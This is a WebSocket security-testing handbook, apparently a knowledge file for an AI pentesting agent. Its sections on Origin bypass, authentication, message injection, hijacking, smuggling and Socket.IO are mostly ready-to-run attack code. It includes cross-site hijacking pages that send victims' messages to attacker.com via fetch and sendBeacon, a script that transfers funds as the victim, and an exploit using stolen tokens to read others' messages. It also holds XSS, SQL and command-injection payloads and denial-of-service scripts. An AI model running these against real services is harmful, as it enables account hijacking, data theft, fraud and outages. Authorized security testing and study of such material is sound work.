> Structure: the upper half is the original mainline (handshake / Origin / CSWSH / injection); the lower half is a supplement for deeper coverage (smuggling, Socket.IO). If the shortlist does not name an endpoint, start with the handshake plus privilege-escalation messages.
>
> When in conflict with `../rules/`, the rules win. If only the Origin check is missing and you never read or modified another user's data → default to not writing it up.

## 1. Original Knowledge Base

# WebSocket Security Testing Handbook

## 1. WebSocket Basics

### 1.1 WebSocket Handshake

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### 1.2 Identifying WebSockets

```bash
# Search in JS files
grep -r "new WebSocket" *.js
grep -r "ws://" *.js
grep -r "wss://" *.js

# Search in network requests (using the js-reverse MCP)
list_network_requests()
# Look for requests with Upgrade: websocket
```

---

## 2. Origin Validation Bypass

### 2.1 Principle

```
WebSocket connections should validate the Origin header to prevent cross-site attacks

Normal: Origin: https://target.com → allowed
Attack: Origin: https://attacker.com → should be rejected

If the server does not validate, or validates loosely → cross-site WebSocket hijacking
```

### 2.2 Testing Methods

```python
import websocket

def test_origin_bypass(ws_url):
    """Test Origin validation"""
    
    origins_to_test = [
        "https://attacker.com",
        "https://target.com.attacker.com",
        "https://attacker.com.target.com",
        "null",
        "",
        "https://target.com:@attacker.com",
    ]
    
    for origin in origins_to_test:
        try:
            ws = websocket.create_connection(
                ws_url,
                header=[f"Origin: {origin}"]
            )
            
            print(f"[+] Origin bypass succeeded: {origin}")
            
            # Try to receive a message
            result = ws.recv()
            print(f"    Received: {result[:100]}")
            
            ws.close()
            
        except Exception as e:
            print(f"[-] Origin rejected: {origin}")
            print(f"    Error: {str(e)[:50]}")
```

### 2.3 Bash Testing

```bash
# websocat test
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# wscat test
wscat -c wss://target.com/chat --origin https://attacker.com
```

---

## 3. Authentication Testing

### 3.1 Authentication Methods

```
1. URL parameter: wss://target.com/chat?token=xxx
2. Cookie: sent automatically during the handshake
3. Custom header: Sec-WebSocket-Protocol: token.xxx
4. First message: {"type": "auth", "token": "xxx"}
```

### 3.2 Testing for Missing Authentication

```python
def test_ws_auth(ws_url):
    """Test WebSocket authentication"""
    
    # Connect without any credentials
    try:
        ws = websocket.create_connection(ws_url)
        
        print("[!] Connected without authentication")
        
        # Try to send a message
        ws.send('{"type": "message", "content": "test"}')
        
        # Receive the response
        result = ws.recv()
        print(f"Response: {result}")
        
        ws.close()
        
    except Exception as e:
        print(f"Connection failed: {e}")
```

### 3.3 Token Replay Testing

```python
def test_token_replay(ws_url, old_token):
    """Test whether a token can be replayed"""
    
    # Use an expired / revoked token
    ws_url_with_token = f"{ws_url}?token={old_token}"
    
    try:
        ws = websocket.create_connection(ws_url_with_token)
        print("[!] Token is replayable")
        ws.close()
    except:
        print("[-] Token is not replayable")
```

---

## 4. Message Injection

### 4.1 JSON Injection

```python
def test_message_injection(ws_url, token):
    """Test message injection"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    # Normal message
    normal_msg = '{"type": "message", "content": "Hello"}'
    ws.send(normal_msg)
    
    # Injection tests
    injection_payloads = [
        # XSS
        '{"type": "message", "content": "<script>alert(1)</script>"}',
        
        # SQL injection
        '{"type": "search", "query": "test\' OR \'1\'=\'1"}',
        
        # Command injection
        '{"type": "ping", "host": "127.0.0.1; whoami"}',
        
        # Type confusion
        '{"type": "message", "userId": {"$ne": null}}',
        
        # Privilege escalation (IDOR)
        '{"type": "message", "targetUserId": "VICTIM_ID"}',
    ]
    
    for payload in injection_payloads:
        ws.send(payload)
        try:
            response = ws.recv()
            print(f"Payload: {payload[:50]}")
            print(f"Response: {response[:100]}")
        except:
            pass
    
    ws.close()
```

### 4.2 Binary Message Injection

```python
def test_binary_injection(ws_url):
    """Test binary messages"""
    
    ws = websocket.create_connection(ws_url)
    
    # Send binary data
    binary_payloads = [
        b"\x00\x00\x00\x01",  # malformed data
        b"\xff" * 1000,       # large volume of data
        b"A" * 10000,         # oversized data
    ]
    
    for payload in binary_payloads:
        ws.send_binary(payload)
        try:
            response = ws.recv()
            print(f"Binary payload sent, response: {response[:50]}")
        except:
            pass
    
    ws.close()
```

---

## 5. Cross-Site WebSocket Hijacking (CSWSH)

### 5.1 Principle

```
Similar to CSRF, but targets WebSocket

1. The victim visits the attacker's site
2. The attacker's site JS connects to the target WebSocket
3. The browser automatically sends the victim's Cookie
4. The attacker performs actions or steals data over the WebSocket
```

### 5.2 PoC Page

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSWSH PoC</title>
</head>
<body>
    <h1>Cross-Site WebSocket Hijacking PoC</h1>
    <div id="output"></div>
    
    <script>
        // Connect to the target WebSocket
        const ws = new WebSocket('wss://target.com/chat');
        
        ws.onopen = function() {
            log('WebSocket connected');
            
            // Send a message
            ws.send(JSON.stringify({
                type: 'getMessages',
                limit: 100
            }));
        };
        
        ws.onmessage = function(event) {
            log('Message received: ' + event.data);
            
            // Send the data to the attacker's server
            fetch('https://attacker.com/steal', {
                method: 'POST',
                body: event.data
            });
        };
        
        ws.onerror = function(error) {
            log('Error: ' + error);
        };
        
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
        }
    </script>
</body>
</html>
```

### 5.3 Protection Detection

```python
def test_cswsh_protection(ws_url):
    """Detect CSWSH protections"""
    
    # 1. Check whether Origin is validated
    # 2. Check whether a CSRF Token is used
    # 3. Check whether Sec-WebSocket-Key is validated
    
    # Connect from a malicious Origin
    try:
        ws = websocket.create_connection(
            ws_url,
            header=["Origin: https://attacker.com"]
        )
        print("[!] No CSWSH protection (Origin not validated)")
        ws.close()
    except:
        print("[+] CSWSH protection present (Origin validated)")
```

---

## 6. Information Disclosure

### 6.1 Sensitive Data Leakage

```python
def monitor_ws_messages(ws_url, token):
    """Monitor WebSocket messages and look for sensitive information"""
    
    ws = websocket.create_connection(f"{ws_url}?token={token}")
    
    sensitive_patterns = [
        r'\b\d{15,19}\b',  # credit card number
        r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
        r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
        r'\b\d{11}\b',  # phone number
        r'password',
        r'token',
        r'secret',
    ]
    
    import re
    
    for _ in range(100):
        try:
            msg = ws.recv()
            
            for pattern in sensitive_patterns:
                if re.search(pattern, msg, re.IGNORECASE):
                    print(f"[!] Sensitive data found: {pattern}")
                    print(f"    Message: {msg[:200]}")
        except:
            break
    
    ws.close()
```

### 6.2 Analysis with the js-reverse MCP

```python
# Use get_websocket_messages from the js-reverse MCP
# to get all WebSocket messages

# 1. Open the target page
# 2. Trigger the WebSocket connection
# 3. Call get_websocket_messages()
# 4. Analyze the message content
```

---

## 7. DoS Attacks

### 7.1 Mass Connections

```python
import threading

def dos_connections(ws_url, count=1000):
    """DoS: mass connections"""
    
    def connect():
        try:
            ws = websocket.create_connection(ws_url)
            # Keep the connection open
            while True:
                ws.recv()
        except:
            pass
    
    threads = []
    for _ in range(count):
        t = threading.Thread(target=connect)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
```

### 7.2 Large Message Attack

```python
def dos_large_message(ws_url):
    """DoS: send an oversized message"""
    
    ws = websocket.create_connection(ws_url)
    
    # Send a 10MB message
    large_msg = "A" * (10 * 1024 * 1024)
    ws.send(large_msg)
    
    ws.close()
```

### 7.3 Slow Attack

```python
def dos_slow_send(ws_url):
    """DoS: slow send"""
    
    import socket
    import ssl
    import time
    
    # Establish a TCP connection
    sock = socket.create_connection(('target.com', 443))
    sock = ssl.wrap_socket(sock)
    
    # Send the WebSocket handshake (slowly)
    handshake = (
        "GET /chat HTTP/1.1\r\n"
        "Host: target.com\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    
    # Send 1 byte per second
    for byte in handshake.encode():
        sock.send(bytes([byte]))
        time.sleep(1)
    
    sock.close()
```

---

## 8. Testing Tools

### 8.1 websocat

```bash
# Install
# Linux: wget https://github.com/vi/websocat/releases/download/v1.11.0/websocat_linux64
# macOS: brew install websocat

# Connect to a WebSocket
websocat wss://target.com/chat

# With a custom header
websocat -H "Origin: https://attacker.com" wss://target.com/chat

# Send file contents
cat payload.json | websocat wss://target.com/chat

# Save received messages
websocat wss://target.com/chat > messages.txt
```

### 8.2 wscat

```bash
# Install
npm install -g wscat

# Connect
wscat -c wss://target.com/chat

# With Origin
wscat -c wss://target.com/chat --origin https://attacker.com

# With a custom header
wscat -c wss://target.com/chat -H "Authorization: Bearer TOKEN"
```

### 8.3 Python websockets Library

```python
import asyncio
import websockets

async def test_websocket():
    uri = "wss://target.com/chat"
    
    async with websockets.connect(uri) as websocket:
        # Send a message
        await websocket.send('{"type": "message", "content": "test"}')
        
        # Receive a message
        response = await websocket.recv()
        print(f"Received: {response}")

asyncio.run(test_websocket())
```

---

## 9. Practical Testing Workflow

### 9.1 Information Gathering

```
1. Find WebSocket endpoints (from JS files or network requests)
2. Analyze the handshake process (auth method, Origin check)
3. Analyze the message format (JSON/binary/text)
4. Identify message types (auth/message/command/subscribe)
```

### 9.2 Security Testing

```
1. Origin validation testing
2. Authentication testing (no auth / weak auth / token replay)
3. Message injection testing (XSS/SQL/command injection)
4. Privilege escalation testing (accessing other users' messages/rooms)
5. CSWSH testing
6. Information disclosure testing
7. DoS testing (with caution)
```

### 9.3 PoC Development

```python
# Full PoC example
import websocket
import json

def exploit_websocket():
    """WebSocket exploitation PoC"""
    
    # 1. Connect (bypassing the Origin check)
    ws = websocket.create_connection(
        "wss://target.com/chat",
        header=["Origin: https://attacker.com"]
    )
    
    print("[+] WebSocket connected (Origin validation bypassed)")
    
    # 2. Authenticate (if needed)
    auth_msg = json.dumps({
        "type": "auth",
        "token": "STOLEN_TOKEN"
    })
    ws.send(auth_msg)
    
    # 3. Access other users' messages (privilege escalation)
    get_messages = json.dumps({
        "type": "getMessages",
        "userId": "VICTIM_ID"
    })
    ws.send(get_messages)
    
    # 4. Receive the response
    response = ws.recv()
    print(f"[+] Obtained the victim's messages: {response}")
    
    # 5. Close the connection
    ws.close()

exploit_websocket()
```

---

## 10. Defense Detection

```python
# Check whether security protections exist

# 1. Origin validation
# Signature: non-whitelisted Origins are rejected

# 2. Authentication requirement
# Signature: without a token, connection or message reception is impossible

# 3. Rate limiting
# Signature: a large number of messages in a short time is limited

# 4. Message validation
# Signature: malicious messages are filtered or rejected

# 5. CSRF Token
# Signature: the handshake requires a CSRF Token
```

---

## 12. References

```
# WebSocket security
https://portswigger.net/web-security/websockets

# CSWSH
https://christian-schneider.net/CrossSiteWebSocketHijacking.html

# WebSocket tools
https://github.com/vi/websocat
https://github.com/websockets/wscat
```

---

## 2. Supplement: websocket

### websocket

### WebSocket Security

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---


## 7. CSWSH — STEP-BY-STEP EXPLOITATION

### Step 1: Confirm no Origin check on WS handshake

```text
### In Burp: intercept the WebSocket upgrade request
### Change Origin header to: https://attacker.com
### If 101 Switching Protocols returned → no Origin validation
### If 403/rejected → Origin is checked (test subdomain variants)
```

### Step 2: Craft attacker page

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Connection established as victim (cookies sent automatically)
    console.log('Connected as victim');
    // Send commands as victim
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### Step 3: Cookies and session hijacking

```text
Browser behavior for WebSocket:
- Cookies for the target domain ARE sent automatically in the upgrade request
- SameSite=None cookies always sent
- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)
- SameSite=Strict cookies: NOT sent

Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?
→ Legacy cookies default to Lax in modern Chrome but None in older browsers
```

### Step 4: Read/write messages as victim

```javascript
// Attacker can both READ and WRITE on the WebSocket
// Read: financial data, private messages, admin commands
// Write: transfer funds, change settings, send messages as victim

ws.onopen = () => {
    // Write: perform actions as victim
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // Read: exfiltrate sensitive data
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WEBSOCKET SMUGGLING

### Concept

Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection.

### Upgrade-based proxy bypass

```text
1. Reverse proxy restricts access to /admin (returns 403)
2. Client sends legitimate WebSocket upgrade to /ws
3. Proxy allows the upgrade (101 response)
4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)
5. Client sends raw HTTP request through the "WebSocket" connection:
   GET /admin HTTP/1.1
   Host: backend-server
6. Backend processes the HTTP request → 200 OK with admin content
```

### H2-over-WebSocket smuggling

```text
1. Connect to target via WebSocket
2. After upgrade, send HTTP/2 preface through the WebSocket tunnel
3. Backend HTTP/2 handler processes the smuggled requests
4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic
```

### Implementation with Python

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

### After upgrade, send raw HTTP through the tunnel
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # binary frame
response = ws.recv()
print(response)
```

### Proxy-specific behaviors

| Proxy | WebSocket Tunnel Behavior |
|-------|--------------------------|
| Nginx | Passes raw TCP after 101 — smuggling possible if backend doesn't validate WS frames |
| HAProxy | Depends on `option http-server-close` vs `tunnel` mode |
| AWS ALB | Terminates WebSocket — reframes traffic, harder to smuggle |
| Cloudflare | Inspects WebSocket frames — raw HTTP smuggling blocked |
| Varnish | Does not support WebSocket natively — upgrade may bypass cache entirely |

---

## 9. SOCKET.IO SPECIFIC VULNERABILITIES

### Namespace injection

Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:

```javascript
// Client connects to privileged namespace without auth check
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// Server may not verify that the client is authorized for /admin namespace
```

### Event name injection

If event names are derived from user input:

```javascript
// Server-side vulnerable pattern:
socket.on(userInput, handler);

// Attacker sends event name that matches internal event:
socket.emit('__disconnect');     // force disconnect other clients
socket.emit('connection');        // re-trigger connection handler
socket.emit('error');             // trigger error handler
```

### Acknowledgement callback abuse

Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

### Protobuf deserialization

Applications using Protocol Buffers over WebSocket may be vulnerable to:

```text
1. Capture binary WebSocket frame
2. Decode protobuf structure (use protoc --decode_raw or protobuf-inspector)
3. Modify field values (e.g., change user_id, amount, role)
4. Re-encode and send modified frame
5. Server deserializes without re-validating field constraints
```

```bash
### Decode captured binary frame
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw

### Output: field structure with types and values
### Modify, re-encode, send back through WebSocket
```

### MessagePack deserialization

```python
import msgpack
import websocket

ws = websocket.create_connection('wss://target.com/ws')

### Decode received binary message
raw = ws.recv()
data = msgpack.unpackb(raw, raw=False)
### data = {'action': 'get_balance', 'user_id': 123}

### Modify and re-send
data['user_id'] = 1  # IDOR: access admin's balance
ws.send(msgpack.packb(data), opcode=0x2)
```

### Type confusion attacks

Binary serialization formats may allow type confusion:

```text
### Original: user_id as integer (field type 0)
### Modified: user_id as string "1 OR 1=1" (field type 2)
### If server doesn't validate types after deserialization → SQL injection

### Original: is_admin as boolean false (0x00)
### Modified: is_admin as boolean true (0x01)
### Direct privilege escalation if server trusts deserialized values
```

### Tools for binary WebSocket analysis

| Tool | Purpose |
|------|---------|
| Burp Suite + SocketSleuth | Intercept and modify binary frames |
| `protobuf-inspector` | Decode unknown protobuf structures |
| `msgpack-tools` | Encode/decode MessagePack CLI |
| `wsdump` (websocket-client) | Raw frame capture and replay |
| Wireshark | Dissect WebSocket frames at protocol level |
